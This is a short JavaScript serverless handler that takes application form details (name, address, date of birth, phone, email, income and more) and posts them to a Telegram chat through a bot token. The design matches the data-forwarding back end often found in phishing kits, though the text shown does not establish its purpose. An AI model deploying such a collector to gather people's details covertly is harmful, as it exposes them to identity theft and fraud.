export default async function handler(req, res) {

if (req.method !== "POST") {
return res.status(405).json({ success: false, message: "Method not allowed" });
}

const {
name, address, dob, phone, email,
occupation, income, packageType,
gender, housing
} = req.body || {};

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Validate env
if (!BOT_TOKEN || !CHAT_ID) {
return res.status(500).json({
success: false,
message: "Missing BOT_TOKEN or CHAT_ID"
});
}

const message = `
📥 NEW APPLICATION

👤 Name: ${name || "-"}
🏠 Address: ${address || "-"}
🎂 DOB: ${dob || "-"}
📞 Phone: ${phone || "-"}
📧 Email: ${email || "-"}
💼 Occupation: ${occupation || "-"}
💰 Income: ${income || "-"}
📦 Package: ${packageType || "-"}
🚻 Gender: ${gender || "-"}
🏡 Housing: ${housing || "-"}
`;

try {

const telegramRes = await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
}
);

const telegramData = await telegramRes.json();

// IMPORTANT: check real Telegram response
if (!telegramData.ok) {
console.log("Telegram failed:", telegramData);
return res.status(500).json({
success: false,
message: "Telegram API error"
});
}

return res.status(200).json({ success: true });

} catch (error) {
console.log("Server error:", error);
return res.status(500).json({
success: false,
message: "Internal server error"
});
}
}